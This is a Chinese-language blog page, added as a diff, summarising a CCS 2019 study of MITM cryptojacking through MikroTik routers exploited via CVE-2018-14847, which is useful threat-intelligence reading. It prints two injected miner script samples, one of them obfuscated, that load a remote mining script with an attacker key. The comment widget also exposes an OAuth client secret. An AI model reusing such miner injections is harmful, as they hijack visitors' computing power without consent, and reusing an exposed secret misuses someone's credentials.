@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="syang">
+  <meta name="description" content="Life Is Like A Boat">
+  
+  
+  <link rel="prev" href="https://syang-ng.github.io/2020/05/cve-2020-10199-nexus-rce/" />
+  
+  <link rel="canonical" href="https://syang-ng.github.io/2020/06/ccs-2019-router/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           CCS 2019 Router | syang&#39;s blog
+       
+  </title>
+  <meta name="title" content="CCS 2019 Router | syang&#39;s blog">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/syang-ng.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "CCS 2019 Router",
+    "headline" : "CCS 2019 Router",
+    "description" : "论文链接：https:\/\/www.cyber-threat-intelligence.com\/publications\/CCS2019-ro",
+    "inLanguage" : "zh-cn",
+    "author" : "syang",
+    "creator" : "syang",
+    "publisher": "syang",
+    "accountablePerson" : "syang",
+    "copyrightHolder" : "syang",
+    "copyrightYear" : "2020",
+    "datePublished": "2020-06-12 13:43:33 \x2b0800 CST",
+    "dateModified" : "2020-06-12 13:43:33 \x2b0800 CST",
+    "url" : "https:\/\/syang-ng.github.io\/2020\/06\/ccs-2019-router\/",
+    "wordCount" : "2888",
+    "keywords" : [  "syang\x27s blog"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://syang-ng.github.io">syang&#39;s blog</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">CCS 2019 Router</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://syang-ng.github.io" rel="author">syang</a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2020-06-12 itemprop="datePublished">June 12, 2020</time>
+                </span>
+                in
+                <i class="iconfont icon-folder"></i>
+                <span class="post-category">
+                        <a href="https://syang-ng.github.io/categories/paper/"> paper </a>
+                        
+                </span>
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>论文链接：https://www.cyber-threat-intelligence.com/publications/CCS2019-router.pdf</p>
+<p>该论文来自代尔夫特理工大学由 Christian Doerr 带领的网络威胁情报实验室，该实验室主要从事互联网威胁情报分析，网络攻击分析等研究。</p>
+<h2 id="背景知识">背景知识</h2>
+<h3 id="cve-2018-14847">CVE-2018-14847</h3>
+<p>该漏洞是一个未授权的任意文件读取漏洞，利用该漏洞可以实现任意文件读取，进而获得用户名密码。结合内置的开发者后门，利用内置用户 devel + admin 用户密码，可以实现登录获取 root shell。</p>
+<p>该漏洞的利用流程如下：</p>
+<p><img src="/images/posts/CCS-2019-router/CVE-2018-14847.png" alt="CVE-2018-14847"></p>
+<h3 id="cryptojacking-by-mitm">Cryptojacking by MITM</h3>
+<p>利用中间人攻击进行挖矿的主要分为四个步骤：</p>
+<ol>
+<li>所有连向端口 80 的连接都被重定向到代理端口 8080</li>
+<li>代理端口会同时加载两个资源，第一个是挖矿相关的资源，第二个则是原本请求的网络资源，然后二者会以左图的方式进行拼接。</li>
+<li>浏览器通过 WebSocket 与一个 WebSocket 代理或者某个矿池建立连接</li>
+<li>用特定的 key 启动 WebWorkers 并开始挖矿</li>
+</ol>
+<p><img src="/images/posts/CCS-2019-router/MITM.png" alt="MITM"></p>
+<h2 id="主要内容">主要内容</h2>
+<p>自从 CoinHive 在 2017 年引入了可以在浏览器上运行的 JavaScript 挖矿脚本后，网页挖矿作为一种替代广告的盈利方式，逐渐被广泛应用并引起了学术界的关注。但现有的研究仍然着眼于最基础的挖矿网页和相应产业的评估，没有注意到一种结合了网页挖矿和中间人攻击的新式利用方式已经悄然流行开来。</p>
+<p>为此，作者通过对一段时期内的网络流量进行分析，发现了该攻击在十个月内感染了高达140万路由器，巅峰时期内同时有 46 万个路由器被感染。同时，该项攻击呈现出的系统化的特性，其中前 10 个收入最高的帐户每月获利估计超过 120 万美元，是之前黑客通过入侵网站或者恶意广告和网站所有者发起的网页挖矿收益的30倍。</p>
+<h2 id="数据集">数据集</h2>
+<p>该数据集分为三个部分:</p>
+<ul>
+<li>Network Telescope  - 监控了约 13 万个 IP 地址，用于分析端口扫描数据</li>
+<li>Censys and Shodan - 搜索引擎，用于搜索相关设备</li>
+<li>Operator NetFlows - 来自一级运营商的网络数据，以 1:8192 的采样率采集</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>数据集</th>
+<th>Time frame</th>
+<th>Size</th>
+<th>Usage in analysis</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Telescope</td>
+<td>Jan 2018 – Jan 2019</td>
+<td>1.6 GB</td>
+<td>Adversarial identification through port scanning</td>
+</tr>
+<tr>
+<td>Censys</td>
+<td>Jul 2018 – Apr 2019</td>
+<td>43 GB</td>
+<td>Adversarial targeted scanning, Infections and re-infections, System architecture, Monetization configuration, Ecosystem</td>
+</tr>
+<tr>
+<td>Shodan</td>
+<td>Jul 2018 – Apr 2019</td>
+<td>236 GB</td>
+<td>Adversarial use of public datasets, System architecture</td>
+</tr>
+<tr>
+<td>NetFlows</td>
+<td>Jan 2018 – Jan 2019</td>
+<td>3.2 TB</td>
+<td>Characterization of port scanning, System architecture, Evolution of monetization, Maintenance patterns, Revenue and ecosystem</td>
+</tr>
+</tbody>
+</table>
+<h2 id="数据分析">数据分析</h2>
+<p>作者总结了基于中间人攻击的挖矿的生命周期，主要分为五个部分，然后作者将针对每个部分进行分析：</p>
+<p><img src="/images/posts/CCS-2019-router/lifecycle.png" alt="LifeCycle"></p>
+<h3 id="identification">Identification</h3>
+<p><img src="/images/posts/CCS-2019-router/Figure5.png" alt="Packets"></p>
+<p>观察上图可以发现一个很明显的现象是，在 4 月 23 号该漏洞被披露之前的 3 月 24 号，Hajime 僵尸网络就已经对 Internet 上的端口执行了集中扫描，因此相应的流量激增了 6 个数量级。但在漏洞披露后，针对 8291 端口的扫描仅仅增长了部分，而这和以往漏洞披露后针对相应漏洞的威胁激增的现象大不相同。</p>
+<p>下图是确认受影响的 IP 地址和相应地理位置的对应图：</p>
+<p><img src="/images/posts/CCS-2019-router/Figure6.png" alt="Geographical location"></p>
+<h3 id="vulnerability-exploitation">Vulnerability Exploitation</h3>
+<p>下图描绘了 140 万个路由器间的密钥转化行为：</p>
+<p><img src="/images/posts/CCS-2019-router/Figure10.png" alt="Reinfections"></p>
+<p>从 <em>iWDUFD</em> 到 <em>ByMzv3</em> 到 <em>aff2ba</em> 再到 <em>ef18c8</em> 这样一个经典的序列验证了这种转化的存在，可以看到节点向同一个方向进行迁移。</p>
+<p>伴随着密钥更新的同时还有代码的更新，可以看到上一段代码在某次被重新感染后就会变成下一段的代码：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://xmr.omine.org/assets/v7.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt; &lt;script&gt;OMINEId(\&#34;4983e34ef01b4b579725b3a228e59e79\&#34;,\&#34;-1\&#34;); throttleMiner=10; &lt;/script&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://xmr.omine.org/assets/v7.js&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0xdafb</span><span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;\\x34\\x39\\x38\\x33\\x65\\x33\\x34\\x65\\x66\\x30\\x31 \\x62\\x34\\x62\\x35\\x37\\x39\\x37\\x32\\x35\\x62\\x33\\x61\\x32\\x32\\x38 \\x65\\x35\\x39\\x65\\x37\\x39&#39;</span>]; <span style="color:#a6e22e">OMINEId</span>(<span style="color:#a6e22e">_0xbdaf</span>(<span style="color:#e6db74">&#39;0x0&#39;</span>),<span style="color:#e6db74">&#39;\\x2d\\x31&#39;</span>);<span style="color:#a6e22e">throttleMiner</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0xa</span>;<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p>总的来说，约 55% 左右的路由器会被超过一个以上的密钥感染，约 15% 的 MikroTik 设备会被超过 5 个以上的密钥感染。</p>
+<h3 id="infection-consolidation">Infection Consolidation</h3>
+<h4 id="node-to-node-reconnaissance">Node to node reconnaissance</h4>
+<p>作者发现流向 8291端口的流量的 6.5％是从其它受感染的 MikroTik 路由器发送的。此外有 948 台受感染的路由器，它们会扫描其本地子网来寻找端口 8291 上其他易受攻击的路由器。</p>
+<h4 id="infrastructure">Infrastructure</h4>
+<p>作者发现，基于 MITM 的网页挖矿一般呈以下结构：</p>
+<p><img src="/images/posts/CCS-2019-router/Figure11.png" alt="system architecture"></p>
+<p>受控制的路由器会定期通过 2008 端口和命令控制服务器交互（平均 30 秒），或者通过 SSH 协议由攻击者控制。作者发现的具有此典型结构的是密钥 <em>hsFAjj</em> 所控制的服务器，此外受到 <em>SK_LCx</em> 和 <em>oDcuak</em> 感染的设备在生命周期的最后也有表现出类似的行为。</p>
+<h3 id="monetization">Monetization</h3>
+<p>一般来说，通过控制的路由器获得收益的方式有以下三种：</p>
+<ol>
+<li>HTTP Proxies</li>
+<li>Socks Proxies</li>
+<li>Cryptojacking Proxies</li>
+</ol>
+<p>三者之中很明显收益最大的是挖矿式的代理，但这里作者发现的一个有意思的现象是 HTTP 代理似乎并没有带来任何收益，因为在 3 天内，这些代理中的 95％ 就被发布到了免费的公共代理列表中。</p>
+<p>下图是攻击者所使用的挖矿服务与时间的关系，可以看到最主流的挖矿服务主要还是 Coinhive、CoinImp 和 Omine 三家。</p>
+<p><img src="/images/posts/CCS-2019-router/Figure15.png" alt="CDF"></p>
+<p>通过观察挖矿时间和相应占比的 CDF 图可以发现，和之前论文相比该攻击更具有持久性，50% 会在 18 天内才被修复，有约 30% 设备会存活超过 50 天。</p>
+<p><img src="/images/posts/CCS-2019-router/Figure16.png" alt="infected per day"></p>
+<p>通过观察新被感染设备与总感染设备的趋势图可以看到，整个生态系统在 1 月下旬发生了巨大变化了，最明显的是参与设备数明显变少，约 87% 的感染路由器从名单中消失了。但这里并没有一个合理的解释，既没有官方的修复或者是见义勇为的白帽子，在作者咨询了 censys 之后排除了扫描策略变化的影响。可以说这种突然断崖式的减少也是研究过程中的一个有趣的发现。</p>
+<h3 id="maintenance">Maintenance</h3>
+<p>一般在获得了一台路由器的权限并不断获利后，下一个需要思考的目标就是如何维持自己的权限。一般来说会利用 SSH 和 Telnet 进行权限的维持。这里一个有意思的发现是，仅有 <em>oDcuak</em>、<em>SK_LCx</em> 和 <em>hsFAjj</em> 三个相关的攻击者有表现出类似的行为，而且它们会在同一个时间点连接同一个服务器，这不禁让人怀疑它们背后其实由同一个团体所操控。</p>
+<p>比如在 2018 年 8 月 3 号到 20 号间，这三个密钥相关的路由器会和 236.197.108.8 建立 SSH 连接，不过 在 11 号到 14 号间，它们会与 236.247.130.64 建立 SSH 连接。建立 SSH 连接的时间主要在午夜或是 16-19 点这个时间段内。</p>
+<h3 id="收益量化">收益量化</h3>
+<p>关于网页挖矿的研究中最重要的一个问题就是如何量化产业链的收益？同之前的网页挖矿相比，基于路由器的中间人挖矿具备规模大、受害者多，且持续时间更长（约 30% 的挖矿会持续50天以上）等特点，带来的收益必然显著高于普通的挖矿。</p>
+<p>作者这里借鉴了 Minesweeper 中的收益计算公式：</p>
+<blockquote>
+<p>traffic [# flows] × avg. time [s] × mining rate [XMR/s] × value [$/XMR] = profit [$]</p>
+</blockquote>
+<p>不同于之前针对网页挖矿的研究可以直接根据 SimilarWeb 的页面访问量和停留时间计算出整体的访问量，所以这里作者利用 Alexa 前一万的页面平均访问时间 293s 作为平均访问时间，假设桌面和移动平台的挖矿速率是 25 次哈希每秒，通过建立的连接数对挖矿收益进行统计。</p>
+<p>两个方法间具体的差异可以参照下表：</p>
+<table>
+<thead>
+<tr>
+<th>Parameter</th>
+<th>Methodology in Minesweeper</th>
+<th>This study</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Number of visitors</td>
+<td>SimilarWeb estimations</td>
+<td># of NetFlows on port 80</td>
+</tr>
+<tr>
+<td>Average hashing rate</td>
+<td>SimilarWeb estimations</td>
+<td>desktop / mobile: 25 H /s</td>
+</tr>
+<tr>
+<td>Monero market value</td>
+<td>$253 as of May ‘18</td>
+<td>$253 for equal comparison</td>
+</tr>
+<tr>
+<td>Time on website</td>
+<td>SimilarWeb estimations</td>
+<td>Average, 1st / 3rd quartile</td>
+</tr>
+</tbody>
+</table>
+<p>根据公式，可以计算出的结果如下图所示，可以看到收益前 10 的挖矿团体每月可获利超过 120 万美元，远远高于之前关于网页挖矿的 41000 美元月收益的估算。</p>
+<p><img src="/images/posts/CCS-2019-router/profit.png" alt="Profit"></p>
+<p>另外两个有意思的发现，一是创新和先制优势并不会体现到收益中，可以看到虽然 <em>hsFAjj</em> 代表的攻击者虽然是最早也是最成体系的一方，但其收益并没有高于 <em>6a9929</em> 代表的攻击者，二是路由器的数量并不能决定收益，这个原因也非常明显，因为相比路由器的数量，路由器的类型更为关键，一个电信级或者企业级路由器能影响的范围不是一个普通的消费级路由器能比的。</p>
+<h2 id="总结">总结</h2>
+<p>本篇论文提出了关于 cryptojacking 的一种全新的攻击方式——基于 MITM 的攻击，并在此基础上进行了深入的 Measurement。根据作者对数据集的分析，可以发现在 2018-2019 间，共有超过 140 万的路由器被攻陷，约占已部署的 MikroTik 路由器的 70%，从中攻击者可以获得超过每月 120 万美元的收益。此外，在对数据集分析的过程中，作者也得出了一些相当有意思的结论，比如说创新和先发优势并不代表收益，有些时候简单快速地侵占更多路由器才有可能带来更多的收益。</p>
+<p>总的来说，作者在目前研究普遍关注对 cryptojacking 的检测的情况下，创新性地发现了一种全新攻击模式并对该模式进行了详细分析，对于我们在威胁情报分析领域的研究有着非常重要的借鉴参考意义。</p>
+<h2 id="参考链接">参考链接</h2>
+<ul>
+<li><a href="https://www.anquanke.com/post/id/162457">深入分析MikroTik RouterOS CVE-2018-14847 &amp; Get bash shell</a></li>
+</ul>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>syang </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://syang-ng.github.io/2020/06/ccs-2019-router/>https://syang-ng.github.io/2020/06/ccs-2019-router/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://syang-ng.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://syang-ng.github.io/2020/05/cve-2020-10199-nexus-rce/" class="prev" rel="prev" title="CVE 2020 10199 Nexus Rce"><i class="iconfont icon-left"></i>&nbsp;CVE 2020 10199 Nexus Rce</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+          
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+  const gitalk = new Gitalk({
+    clientID: '10b807dd4496d773d0b9',
+    clientSecret: 'c5fe75039eb62db59ca9181aa20ebb0a9a73a1fc',
+    repo: 'syang-ng.github.io',
+    owner: 'syang-ng',
+    admin: ['syang-ng'],
+    id: location.pathname, 
+    distractionFreeMode: false 
+  });
+  (function() {
+    if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+      document.getElementById('gitalk-container').innerHTML = 'Gitalk comments not available by default when the website is previewed locally.';
+      return;
+    }
+    gitalk.render('gitalk-container');
+  })();
+</script>
+
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2017 - 2020</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://syang-ng.github.io">syang</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
